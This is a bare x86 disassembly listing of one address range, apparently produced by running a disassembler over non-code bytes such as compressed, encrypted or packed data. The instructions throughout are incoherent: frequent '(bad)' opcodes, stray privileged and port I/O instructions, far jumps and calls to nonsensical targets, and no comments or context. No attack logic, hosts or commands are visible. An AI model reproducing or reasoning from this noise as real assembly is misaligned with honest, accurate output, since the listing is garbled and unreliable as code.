  4282b1:	or     DWORD PTR [esi+0x5cc5d69a],esp
  4282b7:	dec    edx
  4282b8:	push   ecx
  4282b9:	mov    eax,esi
  4282bb:	jl     0x4282fb
  4282bd:	cmp    cl,cl
  4282bf:	sti    
  4282c0:	xchg   esp,eax
  4282c1:	mov    ds:0xab5346f6,eax
  4282c6:	push   ds
  4282c7:	int    0x1f
  4282c9:	jp     0x428319
  4282cb:	scas   al,BYTE PTR es:[edi]
  4282cc:	addr16 dec esp
  4282ce:	call   0xc40d:0x26995253
  4282d5:	mov    ds:0xcc85b4b5,al
  4282da:	sbb    eax,0xb46660f9
  4282df:	or     eax,0x832ba5a9
  4282e4:	cli    
  4282e5:	inc    edi
  4282e6:	iret   
  4282e7:	and    dl,ch
  4282e9:	jge    0x42832b
  4282eb:	push   ebp
  4282ec:	pushf  
  4282ed:	popa   
	...
  428356:	(bad)  
  428357:	fidiv  WORD PTR [esi]
  428359:	loop   0x42839a
  42835b:	jmp    0x5c37:0x7b70ffd7
  428362:	int3   
  428363:	shl    BYTE PTR [esp+edx*2+0x1af67],cl
  42836a:	add    BYTE PTR [ecx],al
  42836c:	add    BYTE PTR [eax],al
  42836e:	(bad)  
  42836f:	pandn  mm7,mm2
  428372:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428373:	rcr    al,cl
  428375:	xor    BYTE PTR [edi],bh
  428377:	mov    ebp,0x131c5349
  42837c:	js     0x4283b7
  42837e:	sub    al,0x93
  428380:	dec    edx
  428381:	dec    esp
  428382:	sbb    eax,0x9ce69813
  428387:	cmc    
  428388:	xor    bl,BYTE PTR [eax-0x57822d8]
  42838e:	dec    ebx
  42838f:	out    0x21,al
  428391:	add    esp,edx
  428393:	addr16 cmp eax,0x7a3cee06
  428399:	pop    edx
  42839a:	xchg   ebp,ebp
  42839c:	mov    ebp,0xb3e95516
  4283a1:	test   DWORD PTR ds:[ebx+0x6f],edx
  4283a5:	xor    BYTE PTR [ecx],bh
  4283a7:	cmp    al,0xab
  4283a9:	and    eax,0xf481ae5b
  4283ae:	fldenv [esp+esi*8+0x50]
  4283b2:	(bad)  
  4283b3:	pop    eax
  4283b4:	and    BYTE PTR [esi+0x24],ch
  4283b7:	push   ebx
  4283b8:	push   es
  4283b9:	pop    eax
  4283ba:	xchg   BYTE PTR [ebx-0x22],dl
  4283bd:	lods   al,BYTE PTR ds:[esi]
  4283be:	jno    0x42836d
  4283c0:	addr16 mov eax,ds:0x5fa0
  4283c4:	adc    BYTE PTR [esi+0x6bcb693b],ah
  4283ca:	push   0x1dedb76b
  4283cf:	push   ss
  4283d0:	lds    eax,FWORD PTR [eax+0x7edf888e]
  4283d6:	loop   0x4283af
  4283d8:	scas   al,BYTE PTR es:[edi]
  4283d9:	pop    ebp
  4283da:	cmp    al,0xdb
  4283dc:	mov    eax,ds:0xdbb61d71
  4283e1:	add    edi,DWORD PTR [ecx]
  4283e3:	inc    ebx
  4283e4:	js     0x42845b
  4283e6:	scas   al,BYTE PTR es:[edi]
  4283e7:	dec    esp
  4283e8:	jo     0x42837b
  4283ea:	leave  
  4283eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283ec:	mov    bh,0x7b
  4283ee:	outs   dx,DWORD PTR ds:[esi]
  4283ef:	cs dec esp
  4283f1:	adc    eax,0x99a7c5c1
  4283f6:	pop    edx
  4283f7:	push   0xffffffca
  4283f9:	jecxz  0x42843c
  4283fb:	enter  0x1137,0x96
  4283ff:	mov    ch,BYTE PTR ds:0x648b3b24
  428405:	or     eax,0x6f7537d1
  42840a:	push   cs
  42840b:	ss jbe 0x4283ae
  42840e:	push   ss
  42840f:	loope  0x428435
  428411:	addr16 sbb al,0xbe
  428414:	addr16 ror al,cl
  428417:	inc    edx
  428418:	push   ebx
  428419:	daa    
  42841a:	mov    bl,0x1
  42841c:	xor    ah,bl
  42841e:	xor    eax,0x1d908356
  428423:	inc    eax
  428424:	mov    ax,ds:0x1993ea73
  42842a:	mov    ch,0xaa
  42842c:	test   eax,0xb92d92ca
  428431:	iret   
  428432:	(bad)  
  428433:	xchg   esi,eax
  428434:	jae    0x4283fa
  428436:	imul   ecx,DWORD PTR [ebx],0x6ca4cd4
  42843c:	out    dx,eax
  42843d:	lds    eax,FWORD PTR [ecx-0x4b447332]
  428443:	ds (bad) 
  428445:	dec    edx
  428446:	inc    edi
  428447:	or     BYTE PTR [eax-0x14],dh
  42844a:	mov    DWORD PTR [edx-0x3374ffc],0xf6be49f8
  428454:	mov    eax,0xe5a7309
  428459:	pop    ds
  42845a:	loop   0x428403
  42845c:	xor    esp,DWORD PTR [ebx]
  42845e:	aad    0x20
  428460:	les    ecx,FWORD PTR [ebp-0x12c47210]
  428466:	aad    0x77
  428468:	div    DWORD PTR [edx]
  42846a:	lea    esp,[esi]
  42846c:	std    
  42846d:	les    eax,FWORD PTR [eax]
	...
  4284d3:	add    BYTE PTR [eax],al
  4284d5:	add    BYTE PTR [esi],cl
  4284d7:	xchg   esp,eax
  4284d8:	jg     0x42853d
  4284da:	(bad)  
  4284db:	jmp    0x4284fb
  4284dd:	std    
  4284de:	mov    edi,0x54abfb32
  4284e3:	xchg   edx,eax
  4284e4:	sbb    al,0xe5
  4284e6:	addr16 mov al,0x1
  4284e9:	add    BYTE PTR [eax],al
  4284eb:	add    DWORD PTR [eax],eax
  4284ed:	add    BYTE PTR [ecx+0xfe735bb],bh
  4284f3:	jne    0x4284d7
  4284f5:	push   edi
  4284f6:	xlat   BYTE PTR ds:[ebx]
  4284f7:	pop    edx
  4284f8:	add    ecx,DWORD PTR [esi+eax*8]
  4284fb:	call   0x3919b0cd
  428500:	int3   
  428501:	push   es
  428502:	and    BYTE PTR [edx-0x44c32e14],bh
  428508:	or     ebx,ecx
  42850a:	test   al,0x45
  42850c:	jmp    esi
  42850e:	inc    edi
  42850f:	sar    BYTE PTR [edi],1
  428511:	push   cs
  428512:	pop    esi
  428513:	dec    edi
  428514:	xor    eax,0x12cac677
  428519:	xor    eax,0xd84847e2
  42851e:	mov    ds:0xf93303b1,eax
  428523:	popf   
  428524:	popa   
  428525:	sub    eax,0xdc57c71a
  42852a:	pusha  
  42852b:	inc    ebp
  42852c:	adc    ah,BYTE PTR [edx+0x2d]
  42852f:	mov    DWORD PTR [ecx-0x24],edi
  428532:	idiv   DWORD PTR [ebx+0x2d664dc7]
  428538:	lds    ebp,FWORD PTR [ebp-0x3b5ea0b6]
  42853e:	dec    esi
  42853f:	dec    esp
  428540:	xchg   DWORD PTR [edi+esi*1+0x30d60cd6],edi
  428547:	fistp  WORD PTR [ebp-0x70]
  42854a:	jge    0x4284f5
  42854c:	dec    ecx
  42854d:	data16 xor al,0x81
  428550:	add    ch,BYTE PTR [ebp-0x3fdc810f]
  428556:	out    0xa8,eax
  428558:	push   esp
  428559:	mov    ecx,0xdf4690e9
  42855e:	mov    eax,edx
  428560:	sub    ecx,DWORD PTR [edi]
  428562:	sbb    DWORD PTR ds:0x4ea8742,0xcbb5358d
  42856c:	pop    ss
  42856d:	nop
  42856e:	mov    DWORD PTR [eax-0x11],ebx
  428571:	mov    esi,0xc36de83a
  428576:	push   esp
  428577:	sub    DWORD PTR [ecx+0x65],ebp
  42857a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42857b:	enter  0x3a35,0xbc
  42857f:	pop    ebx
  428580:	cmp    eax,ecx
  428582:	pop    ecx
  428583:	int    0x87
  428585:	add    eax,DWORD PTR [ebx+0x808aefd]
  42858b:	test   eax,0x761d10e
  428590:	mov    BYTE PTR [eax+0x5454bb55],0xc5
  428597:	push   edx
  428598:	dec    edi
  428599:	jnp    0x428571
  42859b:	mov    DWORD PTR ds:0x8c936499,edi
  4285a1:	and    ah,BYTE PTR [eax+0x5e]
  4285a4:	sub    BYTE PTR ds:0x9cc969eb,al
  4285aa:	daa    
  4285ab:	out    dx,eax
  4285ac:	mov    ch,0x2e
  4285ae:	jmp    0xfc1c:0x9624333c
  4285b5:	push   ebx
  4285b6:	pop    es
  4285b7:	mov    bh,0x7b
  4285b9:	jecxz  0x428558
  4285bb:	cmp    esi,DWORD PTR [esi+0x57]
  4285be:	nop
  4285bf:	pop    esp
  4285c0:	inc    esp
  4285c1:	or     al,BYTE PTR [ebx-0x789cd96d]
  4285c7:	fcom   st(1)
  4285c9:	pop    ebp
  4285ca:	push   esi
  4285cb:	xchg   bh,al
  4285cd:	lds    edi,FWORD PTR [edx+0x6f]
  4285d0:	add    cl,BYTE PTR [ebp-0x537a2ec9]
  4285d6:	or     dh,bh
  4285d8:	xor    al,0x4
  4285da:	mov    edx,0x52c0f678
  4285df:	jb     0x4285e9
  4285e1:	add    BYTE PTR [esi-0x10],dh
  4285e4:	jb     0x4285d9
  4285e6:	pop    es
  4285e7:	ss int 0x6d
  4285ea:	inc    ecx
  4285eb:	aaa    
  4285ec:	mov    ebp,0xb5
	...
  428655:	add    BYTE PTR [ecx-0xa],dl
  428658:	xor    eax,0x5bffb73e
  42865d:	inc    edi
  42865f:	mov    esi,0x751ca3f6
  428664:	mov    ebp,0x1b16708
  428669:	add    BYTE PTR [eax],al
  42866b:	add    DWORD PTR [eax],eax
  42866d:	add    BYTE PTR [edi+0x5ddbada0],bl
  428673:	inc    edx
  428674:	stc    
  428675:	pop    ecx
  428676:	data16 (bad) 
  428678:	jl     0x4286ee
  42867a:	pop    es
  42867b:	sbb    eax,0xbea5d089
  428680:	out    dx,al
  428681:	push   edi
  428682:	sbb    al,0x43
  428684:	push   ebp
  428685:	fdivr  QWORD PTR [ebp+0x1c]
  428688:	xor    ch,BYTE PTR [esi-0x4f]
  42868b:	aas    
  42868c:	aas    
  42868d:	sub    BYTE PTR fs:[si],dl
  428691:	push   0x2e
  428693:	imul   edi,DWORD PTR [esi+0x1a],0xffffffa8
  428697:	daa    
  428698:	fiadd  DWORD PTR [ecx+eax*2+0x1ebd3dce]
  42869f:	das    
  4286a0:	shr    BYTE PTR [esp+ebx*8-0x42a85d0b],1
  4286a7:	aam    0x14
  4286a9:	gs daa 
  4286ab:	test   eax,0x2f139273
  4286b0:	daa    
  4286b1:	shl    DWORD PTR [esp+edx*8+0x56],1
  4286b5:	loopne 0x428706
  4286b7:	dec    ecx
  4286b8:	xor    eax,0xb86397d2
  4286bd:	test   eax,0xbcd107c2
  4286c2:	rcl    DWORD PTR cs:[ecx+0x8d79019],cl
  4286c9:	leave  
  4286ca:	or     BYTE PTR [eax+ecx*2+0x58],0x57
  4286cf:	jno    0x428693
  4286d1:	xor    DWORD PTR [eax+0x1ea21b70],0x35
  4286d8:	mov    eax,0xba3c0dbb
  4286dd:	jecxz  0x4286d9
  4286df:	jo     0x428685
  4286e1:	and    DWORD PTR [edi-0x6b],esi
  4286e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4286e5:	xor    edx,ebp
  4286e7:	in     al,0xaa
  4286e9:	add    DWORD PTR [esi+edx*4],esi
  4286ec:	aaa    
  4286ed:	mov    esp,0x64d214e
  4286f2:	aas    
  4286f3:	or     al,BYTE PTR [ebx+0x6c]
  4286f6:	js     0x4286ef
  4286f8:	sbb    eax,0x75e41528
  4286fd:	outs   dx,BYTE PTR ds:[esi]
  4286fe:	mov    al,ds:0x8ae0ba5
  428703:	dec    eax
  428704:	mov    bl,0x54
  428706:	xchg   esi,eax
  428707:	out    dx,eax
  428708:	mov    DWORD PTR [esi],esp
  42870a:	mov    eax,ds:0xe4ff4cfd
  42870f:	xchg   esp,eax
  428710:	jb     0x428740
  428712:	and    esi,DWORD PTR [ecx+eiz*1-0x29]
  428716:	mov    ebp,0xf7851de2
  42871b:	outs   dx,DWORD PTR ds:[esi]
  42871c:	pushf  
  42871d:	fsubrp st(2),st
  42871f:	mov    eax,0xfdff67fb
  428724:	imul   ebx,DWORD PTR [esp+edi*4-0x3b48bc7e],0x5
  42872c:	sti    
  42872d:	bound  ebp,QWORD PTR [esi]
  42872f:	adc    edi,esp
  428731:	das    
  428732:	shr    BYTE PTR [edi+0x6f9a2433],1
  428738:	mov    ebx,0x61868fda
  42873d:	psadbw mm6,QWORD PTR [edx-0x3]
  428741:	rcl    eax,cl
  428743:	add    eax,0x36c6b9ee
  428748:	cmp    al,0x8c
  42874a:	les    ebp,FWORD PTR [esi-0x3498c95f]
  428750:	adc    BYTE PTR [esi],ah
  428752:	out    0x50,al
  428754:	dec    esi
  428755:	mov    DWORD PTR [eax+0x50fb4811],ebx
  42875b:	pop    ss
  42875c:	add    DWORD PTR [ecx+0x73a1746d],0x321f0808
  428766:	add    ebx,DWORD PTR [eax+0x40]
  428769:	into   
  42876a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42876b:	outs   dx,BYTE PTR ds:[esi]
  42876c:	jb     0x4287e8
	...
  4287d6:	push   esi
  4287d7:	pop    ebx
  4287d8:	xor    al,0x78
  4287da:	cmp    eax,0xe77f5e7f
  4287df:	inc    ebp
  4287e0:	call   0x55b53df8
  4287e5:	mov    DWORD PTR [edi-0x4e],esp
  4287e8:	add    DWORD PTR [eax],eax
  4287ea:	add    BYTE PTR [ecx],al
  4287ec:	add    BYTE PTR [eax],al
  4287ee:	lds    esp,FWORD PTR [eax-0x55]
  4287f1:	addr16 iret 
  4287f3:	push   ebp
  4287f4:	enter  0x8385,0x78
  4287f8:	enter  0x28fa,0xc3
  4287fc:	shl    BYTE PTR [ecx-0x6f951e93],cl
  428802:	adc    edi,DWORD PTR [edx+0x72e5e0ac]
  428808:	retf   
  428809:	jnp    0x4287e4
  42880b:	sbb    al,0x1f
  42880d:	sar    esi,1
  42880f:	cmp    DWORD PTR [ecx+0x54],ecx
  428812:	cld    
  428813:	lods   al,BYTE PTR ds:[esi]
  428814:	mov    ss,WORD PTR [esi]
  428816:	fsubr  DWORD PTR [edi]
  428818:	jb     0x428883
  42881a:	sahf   
  42881b:	mov    al,0xf
  42881d:	fwait
  42881e:	add    al,0xba
  428820:	push   eax
  428821:	ds loopne 0x428820
  428824:	stos   BYTE PTR es:[edi],al
  428825:	fnstsw WORD PTR [edx]
  428827:	sbb    DWORD PTR [edi*4-0x27f11633],esi
  42882e:	movntq (bad),mm1
  42882f:	out    0xcd,eax
  428831:	xchg   edx,eax
  428832:	xor    al,bh
  428834:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428835:	ja     0x4287de
  428837:	jo     0x42882c
  428839:	mov    edi,DWORD PTR es:[edx+0x48e2a452]
  428840:	cmp    DWORD PTR [esi],0x1917c11a
  428846:	loop   0x42888a
  428848:	mov    eax,ds:0xa2a8f21a
  42884d:	ret    0xb5d8
  428850:	xor    bh,BYTE PTR [ebx+ebp*4+0x42]
  428854:	xchg   edi,eax
  428855:	fcom   DWORD PTR [esi+0x70]
  428858:	std    
  428859:	dec    ecx
  42885a:	xchg   edi,eax
  42885b:	pop    ss
  42885c:	add    BYTE PTR [ecx+0x50],ch
  42885f:	out    0xae,eax
  428861:	dec    ebx
  428862:	(bad)  
  428863:	addr16 pop eax
  428865:	jnp    0x4288c8
  428867:	jecxz  0x4287ff
  428869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42886a:	hlt    
  42886b:	fcomp  QWORD PTR [esi]
  42886d:	cmp    ah,bl
  42886f:	add    BYTE PTR [edi-0x73951c37],ah
  428875:	cdq    
  428876:	cmp    esi,DWORD PTR [ebx]
  428878:	mov    WORD PTR [edi+0x34],ss
  42887b:	sub    eax,0x9e900ce3
  428880:	push   es
  428881:	and    al,0x7d
  428883:	push   ss
  428884:	mov    ebp,0xa1c6916f
  428889:	les    esp,FWORD PTR [ebx]
  42888b:	mov    ds:0x7966a15f,eax
  428890:	inc    esp
  428891:	mov    eax,ds:0xa0099b98
  428896:	pop    ebp
  428897:	out    0x93,eax
  428899:	loopne 0x4288bf
  42889b:	mov    ds:0xb0cbe993,eax
  4288a0:	and    al,0x72
  4288a2:	int    0x50
  4288a4:	out    dx,al
  4288a5:	scas   al,BYTE PTR es:[edi]
  4288a6:	push   esi
  4288a7:	mov    al,0xd5
  4288a9:	call   0xf496a357
  4288ae:	mov    dl,0x82
  4288b0:	outs   dx,BYTE PTR ds:[esi]
  4288b1:	mov    esi,0xbb242d1c
  4288b6:	mov    edi,?
  4288b8:	xlat   BYTE PTR ds:[ebx]
  4288b9:	xchg   edi,eax
  4288ba:	popf   
  4288bb:	pop    ebx
  4288bc:	fs add ah,bl
  4288bf:	jmp    0x428916
  4288c1:	imul   edi,DWORD PTR [ecx+eiz*8-0x2b3b5836],0xfffffff1
  4288c9:	leave  
  4288ca:	fst    DWORD PTR [ebx+0x1]
  4288cd:	scas   eax,DWORD PTR es:[edi]
  4288ce:	pop    esi
  4288cf:	frstor [ecx]
  4288d1:	sbb    al,0xdd
  4288d3:	(bad)  
  4288d4:	pop    edi
  4288d5:	inc    ecx
  4288d6:	les    edx,FWORD PTR [edi]
  4288d8:	aaa    
  4288d9:	push   edi
  4288da:	adc    ah,BYTE PTR [ecx+0x69]
  4288dd:	xchg   ebp,eax
  4288de:	jg     0x4288d4
  4288e0:	and    DWORD PTR [ecx],ebp
  4288e2:	mov    al,0x76
  4288e4:	fcmovnbe st,st(1)
  4288e6:	mov    ebx,0x5d201e99
  4288eb:	aaa    
  4288ec:	adc    DWORD PTR [edx+0x0],0x0
	...
  428953:	add    BYTE PTR [eax],al
  428955:	add    BYTE PTR [esi],ah
  428957:	jp     0x4289ca
  428959:	les    edi,FWORD PTR [ebp-0x31]
  42895c:	mov    bh,0xfa
  42895e:	arpl   WORD PTR [esi-0x3a7962f1],bx
  428964:	mov    eax,0x1b367a1
  428969:	add    BYTE PTR [eax],al
  42896b:	add    DWORD PTR [eax],eax
  42896d:	add    BYTE PTR [eax-0x68c16212],dl
  428973:	enter  0x10d3,0xd6
  428977:	pop    ss
  428978:	mov    ebp,0xd9ec204e
  42897d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42897e:	lds    edx,FWORD PTR [esi+0x36b3f3d6]
  428984:	lock mov dl,0xe4
  428987:	cmp    eax,0xbb58dc
  42898c:	(bad)
  42898f:	adc    edi,eax
  428991:	push   es
  428992:	pop    esi
  428993:	cdq    
  428994:	fwait
  428995:	jae    0x4289ec
  428997:	push   edi
  428998:	inc    edi
  428999:	mov    ebp,0x3f4ce3e8
  42899e:	test   eax,0x431e333f
  4289a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4289a4:	pop    eax
  4289a5:	xor    DWORD PTR [ecx],ebp
  4289a7:	sub    eax,0xc78ec849
  4289ac:	adc    DWORD PTR ss:[ebx-0x6d1ac15],ebp
  4289b3:	xor    al,0x5f
  4289b5:	cmp    bh,dh
  4289b7:	pop    ebx
  4289b8:	jmp    0xfd8b4114
  4289bd:	repz lahf 
  4289bf:	or     BYTE PTR [eax],cl
  4289c1:	lds    edi,FWORD PTR [edi-0x57d9bc6e]
  4289c7:	lock xchg edx,eax
  4289c9:	mov    edi,DWORD PTR [ebp-0x33e14eda]
  4289cf:	ins    DWORD PTR es:[edi],dx
  4289d0:	pop    es
  4289d1:	mov    dh,0x4b
  4289d3:	adc    eax,0xb00a50ef
  4289d8:	xor    edx,DWORD PTR [edi-0x50]
  4289db:	push   edi
  4289dc:	pop    ebp
  4289dd:	outs   dx,DWORD PTR ds:[esi]
  4289de:	sbb    eax,0x867216c8
  4289e3:	push   ds
  4289e4:	mov    ds:0xc500fc2d,al
  4289e9:	xchg   edi,eax
  4289ea:	inc    eax
  4289eb:	mov    bl,0x86
  4289ed:	fs pop ebx
  4289ef:	mov    ch,0x3d
  4289f1:	adc    bh,BYTE PTR [ebp-0x733f6831]
  4289f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4289f8:	or     BYTE PTR [ebp-0x3a],dl
  4289fb:	sti    
  4289fc:	js     0x428a65
  4289fe:	inc    eax
  4289ff:	or     eax,0x680578ea
  428a04:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428a06:	fst    QWORD PTR [eax]
  428a08:	cmp    cx,WORD PTR [eax+edx*8]
  428a0c:	loope  0x428a5e
  428a0e:	std    
  428a0f:	addr16 adc eax,0xdbde4692
  428a15:	es and al,0x96
  428a18:	hlt    
  428a19:	add    DWORD PTR [ebx],esi
  428a1b:	cwde   
  428a1c:	or     DWORD PTR [ecx+0x7b7d8d1c],eax
  428a22:	xor    BYTE PTR [edi-0x7c],ch
  428a25:	ins    DWORD PTR es:[edi],dx
  428a26:	ret    0x914e
  428a29:	not    BYTE PTR [ebx+eiz*2]
  428a2c:	mov    ebx,DWORD PTR [ebx]
  428a2e:	cmovnp ecx,DWORD PTR [ebx]
  428a31:	mov    fs:0xb2df73d8,al
  428a37:	std    
  428a38:	out    dx,eax
  428a39:	fldenv [eax-0x75]
  428a3c:	ud0    edi,DWORD PTR [ebp+0x4b238cdc]
  428a43:	or     ebp,DWORD PTR [esi-0x1ac01623]
  428a49:	inc    esi
  428a4a:	inc    esi
  428a4b:	add    ecx,ebp
  428a4d:	pushf  
  428a4e:	stos   BYTE PTR es:[edi],al
  428a4f:	loope  0x428a45
  428a51:	mov    edi,0xef24a67d
  428a56:	lods   al,BYTE PTR ds:[esi]
  428a57:	repnz rcl DWORD PTR [eax-0x4634fda],1
  428a5e:	sbb    BYTE PTR [ecx+edx*2+0x54],cl
  428a62:	leave  
  428a63:	adc    al,0x28
  428a65:	add    al,0xf6
  428a67:	xor    cl,dh
  428a69:	inc    esp
  428a6a:	in     eax,0xb
  428a6c:	inc    edi
  428a6d:	sub    DWORD PTR [eax],eax
	...
  428ad3:	add    BYTE PTR [eax],al
  428ad5:	add    BYTE PTR [ebp+0xc],cl
  428ad8:	clc    
  428ad9:	pop    ebx
  428ada:	stc    
  428adb:	(bad)  
  428adc:	out    dx,eax
  428add:	push   ds
  428ade:	pop    ds
  428adf:	bound  edx,QWORD PTR [eax+0x2e2e7913]
  428ae5:	and    BYTE PTR [edi-0x4c],0x1
  428ae9:	add    BYTE PTR [eax],al
  428aeb:	add    DWORD PTR [eax],eax
  428aed:	add    BYTE PTR [ebx+0x819d1a1],al
  428af3:	jbe    0x428aee
  428af5:	call   0x515fb60a
  428afa:	aad    0xfd
  428afc:	sbb    bh,ch
  428afe:	dec    ebp
  428aff:	xor    edx,ebx
  428b01:	sbb    DWORD PTR [ebp-0x7b5e7afc],esi
  428b07:	pop    ds
  428b08:	sbb    edx,DWORD PTR [edi+eax*8]
  428b0b:	stos   BYTE PTR es:[edi],al
  428b0c:	inc    ebp
  428b0d:	xor    al,0x1f
  428b0f:	scas   al,BYTE PTR es:[edi]
  428b10:	sbb    eax,0xeb0a60c7
  428b15:	xor    esp,eax
  428b17:	aaa    
  428b18:	mov    bh,0x1f
  428b1a:	or     eax,DWORD PTR [edi]
  428b1c:	jp     0x428b58
  428b1e:	mov    ds:0xd39829c2,al
  428b23:	dec    esi
  428b24:	fimul  DWORD PTR [ebp+0x6]
  428b27:	sbb    DWORD PTR [edx-0x5e372be3],0xffffffd5
  428b2e:	fistp  QWORD PTR [edx-0x80]
  428b31:	lock push ss
  428b33:	in     al,0xdb
  428b35:	mov    edi,0x63259445
  428b3a:	call   0xc1ad:0xb1e0769
  428b41:	cmc    
  428b42:	xor    bl,0x57
  428b45:	dec    edi
  428b46:	ins    DWORD PTR es:[edi],dx
  428b47:	and    DWORD PTR [ebp-0x14],esi
  428b4a:	mov    dh,BYTE PTR [edx+0x35]
  428b4d:	xor    bl,ch
  428b4f:	pop    ss
  428b50:	lds    ecx,FWORD PTR ds:0xaa845bcd
  428b56:	xor    edi,ebp
  428b58:	hlt    
  428b59:	mov    edi,0xb00e6457
  428b5e:	pop    eax
  428b5f:	sub    al,0x47
  428b61:	cwde   
  428b62:	xchg   ebp,eax
  428b63:	and    eax,0x47461141
  428b68:	retf   0x3c97
  428b6b:	jl     0x428b37
  428b6d:	fisttp WORD PTR [ecx-0x1]
  428b70:	and    al,0x7a
  428b72:	shrd   DWORD PTR [ebx-0x2c],ebp,0xcd
  428b77:	xor    al,0x46
  428b79:	outs   dx,DWORD PTR ds:[esi]
  428b7a:	pop    es
  428b7b:	push   edi
  428b7c:	test   DWORD PTR [ecx],ebp
  428b7e:	mov    esi,0xe7a5b6b5
  428b83:	(bad)  
  428b84:	sbb    cl,BYTE PTR [ebx]
  428b86:	imul   edx,DWORD PTR [edx],0x9eb94701
  428b8c:	les    ecx,FWORD PTR [ebx]
  428b8e:	pop    ss
  428b8f:	push   ecx
  428b90:	mov    ah,0xb3
  428b92:	enter  0xee3,0xec
  428b96:	mov    edx,0x7fb32bb3
  428b9b:	sbb    dl,dl
  428b9d:	in     eax,dx
  428b9e:	sbb    eax,0xce4e5b30
  428ba3:	xlat   BYTE PTR ds:[ebx]
  428ba4:	cs dec edi
  428ba6:	jbe    0x428b40
  428ba8:	das    
  428ba9:	or     al,0xf
  428bab:	shl    WORD PTR [esi-0x7b],0xc
  428bb0:	or     al,BYTE PTR [ecx]
  428bb2:	fld    DWORD PTR ds:0xfd279346
  428bb8:	xchg   esp,eax
  428bb9:	pop    eax
  428bba:	mov    bl,0x6e
  428bbc:	inc    eax
  428bbd:	js     0x428bd1
  428bbf:	in     al,dx
  428bc0:	ins    DWORD PTR es:[edi],dx
  428bc1:	cmp    DWORD PTR [ecx+0x3e],edi
  428bc4:	not    edx
  428bc6:	(bad)  
  428bc7:	stos   BYTE PTR es:[edi],al
  428bc8:	cwde   
  428bc9:	sbb    eax,0x1b8fcc51
  428bce:	stos   DWORD PTR es:[edi],eax
  428bcf:	jl     0x428c33
  428bd1:	popf   
  428bd2:	push   esi
  428bd3:	mov    ds:0xd9c06e30,al
  428bd8:	cmc    
  428bd9:	add    eax,0x696ac213
  428bde:	xor    BYTE PTR [edi-0x8],bl
  428be1:	out    dx,eax
  428be2:	dec    ebx
  428be3:	mov    WORD PTR [esi+0x48],es
  428be6:	fsub   st(2),st
  428be8:	pop    esi
  428be9:	outs   dx,DWORD PTR ds:[esi]
  428bea:	out    0xdd,eax
  428bec:	mov    esi,0x3f
	...
  428c55:	add    ch,al
  428c57:	push   ebp
  428c58:	mov    bh,dl
  428c5a:	call   0xbbc:0x947ff5ff
  428c61:	push   0x2b2f06c8
  428c66:	addr16 mov ch,0x1
  428c69:	add    BYTE PTR [eax],al
  428c6b:	add    DWORD PTR [eax],eax
  428c6d:	add    dh,bl
  428c6f:	sti    
  428c70:	dec    esi
  428c71:	shl    ecx,1
  428c73:	inc    edi
  428c74:	inc    ebx
  428c75:	das    
  428c76:	xchg   edx,eax
  428c77:	imul   eax,DWORD PTR [esi+eiz*8-0x21],0x1eecfd8d
  428c7f:	outs   dx,DWORD PTR ds:[esi]
  428c80:	cwde   
  428c81:	mov    eax,0x812a2bfc
  428c86:	and    dl,BYTE PTR [edi+0x1f]
  428c89:	aaa    
  428c8a:	dec    ecx
  428c8b:	and    al,0xd9
  428c8d:	lea    ecx,[ebp-0x64]
  428c90:	fadd   QWORD PTR ds:0x644a57f1
  428c96:	mov    edi,0xf2fd0a1e
  428c9b:	cmp    ebx,DWORD PTR [edx-0x6a60acf2]
  428ca1:	mov    edi,0x67a12837
  428ca6:	cld    
  428ca7:	inc    eax
  428ca8:	cdq    
  428ca9:	mov    edx,DWORD PTR [ecx+0x2294cc3e]
  428caf:	cmp    eax,DWORD PTR [esp+edx*4+0x493ad2a7]
  428cb6:	sar    DWORD PTR [edx-0x537af1be],cl
  428cbc:	inc    ebx
  428cbd:	push   esp
  428cbe:	jle    0x428cc2
  428cc0:	or     edi,DWORD PTR [edx+0x3aa603bb]
  428cc6:	mov    al,0x2e
  428cc8:	or     eax,0x9c2edaed
  428ccd:	popa   
  428cce:	aas    
  428ccf:	jae    0x428c8c
  428cd1:	xor    eax,0xf35ffb88
  428cd6:	icebp  
  428cd7:	dec    edi
  428cd8:	popa   
  428cd9:	xchg   ebx,eax
  428cda:	btr    DWORD PTR [ebp+0x46c15917],edx
  428ce1:	stos   DWORD PTR es:[edi],eax
  428ce2:	or     DWORD PTR [edx+ebx*2],ebx
  428ce5:	dec    edx
  428ce6:	test   eax,0x22ef33e8
  428ceb:	retf   
  428cec:	push   eax
  428ced:	rol    BYTE PTR [eax],0x6d
  428cf0:	out    0x35,eax
  428cf2:	mov    al,0x6
  428cf4:	cmc    
  428cf5:	and    bh,ch
  428cf7:	fstp   DWORD PTR [edx+0x5aef0de3]
  428cfd:	popa   
  428cfe:	mov    ebp,0xf15aa225
  428d03:	or     edx,DWORD PTR [ecx+esi*1]
  428d06:	jle    0x428d66
  428d08:	xchg   ebp,eax
  428d09:	ss xchg ebp,eax
  428d0b:	mov    al,0x2a
  428d0d:	lods   al,BYTE PTR ds:[esi]
  428d0e:	sub    edx,DWORD PTR [ebp-0x73]
  428d11:	int    0xb0
  428d13:	dec    edx
  428d14:	shl    esi,0xcc
  428d17:	cmp    al,0xe4
  428d19:	repnz scas al,BYTE PTR es:[edi]
  428d1b:	fs ret 
  428d1d:	loop   0x428d79
  428d1f:	sbb    eax,0xd148ba28
  428d24:	xchg   ecx,eax
  428d25:	add    al,0x2c
  428d27:	mov    ebx,0xb9a7b35
  428d2c:	push   es
  428d2d:	or     di,WORD PTR [edi-0x4ab6e142]
  428d34:	mov    ds:0x7b9684c7,al
  428d39:	js     0x428d5c
  428d3b:	lods   eax,DWORD PTR ds:[esi]
  428d3c:	sbb    al,0x9f
  428d3e:	addr16 pop ecx
  428d40:	add    bl,BYTE PTR [edi-0x264845ed]
  428d46:	cwde   
  428d47:	out    dx,eax
  428d48:	sub    eax,0xbe700e6b
  428d4d:	(bad)  
  428d4e:	scas   al,BYTE PTR es:[edi]
  428d4f:	repz adc al,ah
  428d52:	push   edx
